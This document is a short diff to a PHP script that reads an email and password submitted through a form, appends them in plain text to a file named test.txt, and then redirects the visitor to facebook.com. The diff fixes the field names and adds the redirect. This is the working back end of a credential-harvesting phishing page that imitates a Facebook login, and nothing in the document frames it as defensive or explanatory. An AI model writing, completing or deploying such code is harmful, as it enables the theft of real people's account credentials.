@@ -1,10 +1,10 @@
 <?php 
-	$Email=$_POST[E-mail];
+	$Email=$_POST[Email];
 	$Password=$_POST[password];
-	$Email2=$_POST[E-mail2];
-	$Password2=$_POST[password2];
 	
 	$file=fopen("test.txt", "a");
-	fwrite($file，"$Email $Email2 $Password $Password2 \r\n");
+	fwrite($file,"Email  $Email  password  $Password  \r\n");
 	fclose($file);
+
+	header("Location: https://www.facebook.com"); 
 ?>
